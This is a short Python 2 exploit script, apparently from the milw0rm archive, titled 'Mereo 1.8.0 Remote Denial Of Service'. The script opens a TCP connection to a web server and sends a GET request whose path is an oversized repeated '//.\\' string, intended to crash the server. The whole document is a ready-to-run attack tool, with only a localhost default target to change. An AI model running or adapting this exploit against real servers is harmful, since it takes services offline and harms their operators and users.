import socket
import sys
print "------------------------------------------------------"
print " Mereo 1.8.0  Remote Denial Of Service                "
print " author: Stack                                      "
print "------------------------------------------------------"
host = "127.0.0.1"
port = 80
try:
       buff = "//.\\" * 330
       request =  "GET " + buff + " HTTP/1.0"
       connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       connection.connect((host, port))
       connection.send(request)
       raw_input('\n\nExploit completed. Press "Enter" to quit...')
       sys.exit
except:
       raw_input('\n\nUnable to connect. Press "Enter" to quit...')

# milw0rm.com [2009-05-18]